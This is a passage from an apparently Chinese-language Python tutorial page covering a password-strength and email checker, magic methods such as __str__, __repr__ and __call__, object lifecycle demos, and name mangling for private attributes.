punctuation\">.</span>is_by_step<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>            <span class=\"token keyword\">return</span> Strength<span class=\"token punctuation\">(</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"simple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"密码有规则\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>is_common<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            <span class=\"token keyword\">return</span> Strength<span class=\"token punctuation\">(</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"simple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"密码很常见\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        types <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>        <span class=\"token keyword\">if</span> NUMBER<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#检测密码中是否含有数字</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>            types <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>        <span class=\"token keyword\">if</span> LOWER_CASE<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#检测密码中是否含有小写字母</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>            types <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        <span class=\"token keyword\">if</span> UPPER_CASE<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#检测密码中是否含有大写字母</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>            types <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token keyword\">if</span> OTHERS<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#检测密码中是否含有特殊字符</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>            types <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token keyword\">if</span> types <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>            <span class=\"token keyword\">return</span> Strength<span class=\"token punctuation\">(</span>level <span class=\"token operator\">&lt;=</span> self<span class=\"token punctuation\">.</span>SIMPLE<span class=\"token punctuation\">,</span> <span class=\"token string\">\"simple\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"密码太简单了\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token keyword\">if</span> types <span class=\"token operator\">&lt;</span> min_type<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token keyword\">return</span> Strength<span class=\"token punctuation\">(</span>level <span class=\"token operator\">&lt;=</span> self<span class=\"token punctuation\">.</span>MEDIUM<span class=\"token punctuation\">,</span> <span class=\"token string\">\"medium\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"密码还不够强\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        <span class=\"token keyword\">return</span> Strength<span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"strong\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"密码很强\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Email</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        self<span class=\"token punctuation\">.</span>email <span class=\"token operator\">=</span> email</pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">is_valid_email</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>        <span class=\"token keyword\">if</span> re<span class=\"token punctuation\">.</span>match<span class=\"token punctuation\">(</span><span class=\"token string\">\"^.+@(\\\\[?)[a-zA-Z0-9\\\\-\\\\.]+\\\\.([a-zA-Z]&#123;2,3&#125;|[0-9]&#123;1,3&#125;)(\\\\]?)$\"</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_email_type</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>        types <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'qq'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'163'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'gmail'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'126'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sina'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>            re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'@\\w+'</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>            email_type <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'@\\w+'</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>email<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>            email_type <span class=\"token keyword\">in</span> types</pre></td></tr><tr><td data-num=\"125\"></td><td><pre>            <span class=\"token keyword\">return</span> email_type</pre></td></tr><tr><td data-num=\"126\"></td><td><pre>        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'wrong email'</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">checkpwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    password <span class=\"token operator\">=</span> Password<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    pwd <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要检测的密码：\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    p <span class=\"token operator\">=</span> password<span class=\"token punctuation\">(</span>pwd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Whether the password is valid：'</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">.</span>__bool__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'prompt message：'</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Password Strength：'</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">.</span>__repr__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre></pre></td></tr><tr><td data-num=\"137\"></td><td><pre></pre></td></tr><tr><td data-num=\"138\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">checkemail</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>    email <span class=\"token operator\">=</span> Email<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'请输入要检测的邮箱：'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>email<span class=\"token punctuation\">.</span>is_valid_email<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>email<span class=\"token punctuation\">.</span>get_email_type<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre></pre></td></tr><tr><td data-num=\"144\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">primarymain</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>        select <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.检测密码\\n2.检测邮箱\\n3.退出\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>        <span class=\"token keyword\">if</span> select <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>            checkpwd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>        <span class=\"token keyword\">elif</span> select <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>            checkemail<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>            exit<span class=\"token punctuation\">(</span><span class=\"token string\">'bye'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre></pre></td></tr><tr><td data-num=\"154\"></td><td><pre></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>primarymain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>__repr__()</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    1、用print去打印 实例，调用顺序是：重写的__str__方法>重写的__repr__方法>未重写的__str__方法>未重写的__repr__方法</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    2、__str__实际上是调用了__repr__</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>__str__()</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    如果一个类中定义了__str__()方法，那么在打印&lt;对象>时，默认输出该方法的返回值。</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>__bool__()</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    返回真或假</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>__call__():</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    如果为一个类编写了该方法，那么在该类的实例后面加括号，可会调用这个方法。</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    注：构造方法的执行是由类加括号执行的，即：对象 = 类名()，而对于__call__() 方法，</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    是由对象后加括号触发的，即：对象() 或者 类()()</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>'''</span></pre></td></tr></table></figure><h3 id=\"斐波那契数列\"><a class=\"anchor\" href=\"#斐波那契数列\">#</a> 斐波那契数列</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Fibonacci</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__call__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        a<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>lst <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span> num <span class=\"token operator\">&lt;=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            self<span class=\"token punctuation\">.</span>lst<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            self<span class=\"token punctuation\">.</span>lst<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> num <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                self<span class=\"token punctuation\">.</span>lst<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                a<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> b<span class=\"token punctuation\">,</span> a <span class=\"token operator\">+</span> b</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>lst</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>lst<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>f <span class=\"token operator\">=</span> Fibonacci<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ret <span class=\"token operator\">=</span> f<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"帮助自己理解\"><a class=\"anchor\" href=\"#帮助自己理解\">#</a> 帮助自己理解</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__new__</span><span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'->>>>>_new1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token builtin\">object</span><span class=\"token punctuation\">.</span>__new__<span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'->>>>_init_2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__del__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'->>>>_del_'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">B</span><span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__call__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'dijia!!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"gaiya!!\"</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__repr__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"daina!!\"</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>b <span class=\"token operator\">=</span> A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'kongnijiwa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>a <span class=\"token operator\">=</span> A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>d <span class=\"token operator\">=</span> B<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>d<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#### 输出结果</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span><span class=\"token operator\">></span>_new1</pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span>_init_2</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>kongnijiwa</pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span><span class=\"token operator\">></span>_new1</pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span>_init_2</pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span><span class=\"token operator\">></span>_new1</pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span>_init_2</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>dijia!!</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>gaiya!!</pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span>_del_</pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span>_del_</pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span>_del_</pre></td></tr></table></figure><h2 id=\"公有与私有\"><a class=\"anchor\" href=\"#公有与私有\">#</a> 公有与私有</h2>\n<p>Python 中并没有像 C++、JAVA 那样使用关键字 public 和 private，用于声明数据是公有还是私有。为了实现私有变量的特征，Python 内部采用了一种叫 name mangling（名字改编）的技术，在 Python 中定义私有变量，只需要在变量名或函数名前加上 &quot;__&quot; 两个下划线，那么这个变量或函数就会变成私有的了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    __name <span class=\"token operator\">=</span> <span class=\"token string\">\"dijia\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a <span class=\"token operator\">=</span> A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>__name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#### 输出</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  File <span class=\"token string\">\"G:/Text_Files/1.py\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">199</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    a<span class=\"token punctuation\">.</span>__name</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>AttributeError<span class=\"token punctuation\">:</span> <span class=\"token string\">'A'</span> <span class=\"token builtin\">object</span> has no attribute <span class=\"token string\">'__name'</span></pre></td></tr></table></figure><p>但你认真琢磨一下这个技术的名字 name mangling (名字改编)，不难发现其实 Python 只是把两个下划线开头的变量进行了改名罢了。实际上在外部你使用 “_类名__变量名” 即可访问私有变量了：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    __name <span class=\"token operator\">=</span> <span class=\"token string\">\"dijia\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a <span class=\"token operator\">=</span> A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>_A__name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">####### 输出</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>dijia</pre></td></tr></table></figure><p>Python 目前的私有机制其实就是伪私有，Python 的类是没有控制权限的，所有变量都可以被外部调用的。</p>\n<h2 id=\"面向对象编程有三大重要特征封装-继承和多态\"><a class=\"anchor\" href=\"#面向对象编程有三大重要特征封装-继承和多态\">#</a> 面向对象编程有三大重要特征：封装、继承和多态</h2>\n<h3 id=\"封装\"><a class=\"anchor\" href=\"#封装\">#</a> 